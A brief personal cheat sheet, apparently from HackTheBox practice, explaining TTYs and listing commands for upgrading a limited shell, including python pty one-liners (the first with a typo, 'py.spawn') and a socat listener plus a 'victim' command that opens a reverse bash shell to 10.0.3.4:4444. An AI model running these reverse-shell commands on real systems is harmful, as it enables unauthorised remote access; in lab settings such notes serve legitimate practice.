# The TTY is a Teletype terminals. 
The following article gives a really great overview of what a TTY is http://www.linusakesson.net/programming/tty/index.php.

# Some commands I've used to escape TTY when doing HackTheBox:

1.  python -c "import pty;py.spawn('/bin/bash')"
2.  python -c 'import pty; pty.spawn("/bin/sh")'
3.  python -c 'import pty; pty.spawn("/bin/bash")'
4.  socat file:`tty`,raw,echo=0 tcp-listen:4444 (On Kali Listen)
5.  socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444 (Victim run it)
